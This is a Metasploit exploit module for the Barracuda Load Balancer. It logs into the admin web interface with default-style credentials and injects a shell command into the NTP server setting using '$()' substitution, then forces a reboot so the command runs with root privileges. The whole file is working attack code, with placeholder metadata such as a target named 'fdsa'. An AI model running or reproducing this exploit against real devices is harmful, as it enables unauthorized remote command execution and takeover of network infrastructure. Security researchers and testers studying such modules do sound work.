##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
require 'digest/md5'
 
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
 
include Msf::Exploit::Remote::HttpClient
 
def initialize(info={})
super(update_info(info,
'Name' => "Barracuda Load Balancer Post-Auth Remote Command Exec",
'Description' => %q{
Don't forget to set WfsDelay to 120 or so. Server has to reboot to run command.
},
'License' => MSF_LICENSE,
'Author' =>
[
],
'References' =>
[
],
'Arch' => ARCH_CMD,
'Compat' =>
{
'PayloadType' => 'cmd'
},
'Platform' => %w{ linux unix },
'Targets' =>
[
['fdsa', {}]
],
'Privileged' => true,
'DisclosureDate' => "",
'DefaultTarget' => 0))
 
register_options(
[
OptString.new('USERNAME', [true, 'Barracuda Username', 'admin']),
OptString.new('PASSWORD', [true, 'Barracuda Password', 'admin']),
], self.class)
end
 
def exploit
res = send_request_cgi({
'uri' => normalize_uri(target_uri, "/cgi-mod/index.cgi")
})
 
res.body =~ /name=enc_key value=(.*)><input type=hidden name=et value=(.*)><tr>/
 
salt = $1
et = $2
 
salted_hash = Digest::MD5.hexdigest(datastore["PASSWORD"] + salt)
 
post_data = {
'real_user' => '',
'login_state' => 'out',
'enc_key' => salt,
'et' => et,
'locale' => 'en_US',
'user' => datastore['USERNAME'],
'password' => salted_hash,
'enctype' => 'MD5',
'password_entry' => '',
'Submit' => 'Login'
}
 
res = send_request_cgi({
'method' => 'POST',
'uri' => normalize_uri(target_uri, "/cgi-mod/index.cgi"),
'vars_post' => post_data
})
 
if res.code == 302
fail_with("Invalid credentials")
end
 
#set up the payload
post_data = {
'auth_type' => 'Local',
'et' => et,
'password' => salted_hash,
'primary_tab' => 'ADVANCED',
'realm' => '',
'secondary_tab' => 'system_settings',
'user' => datastore['USERNAME'],
'locale' => 'en_US',
'q' => '',
'UPDATE_new_system_ntp_server' => 'pool.n$(' + payload.encoded + ')tp.org',
'UPDATE_new_system_ntp_desc' => '',
'add_system_ntp_server' => 'Add'
}
 
res = send_request_cgi({
'uri' => normalize_uri(target_uri, '/cgi-mod/index.cgi'),
'method' => 'POST',
'vars_post' => post_data
})
 
 
#reboot and trigger payload, may take a minute or two
post_data = {
'auth_type' => 'Local',
'et' => et,
'password' => salted_hash,
'primary_tab' => 'BASIC',
'realm' => '',
'secondary_tab' => 'administration',
'user' => datastore['USERNAME'],
'locale' => 'en_US',
'q' => '',
'UPDATE_set_reboot' => 'set_set_reboot',
'set_set_reboot' => 'Restart'
}
 
res = send_request_cgi({
'uri' => normalize_uri(target_uri, '/cgi-mod/index.cgi'),
'method' => 'POST',
'vars_post' => post_data
})
 
print_status ("Waiting for the reboot...")
 
#there will be an artifact in the UI when you go to the NTP config page
#the payload will be visible. You should delete this manually.
end
end
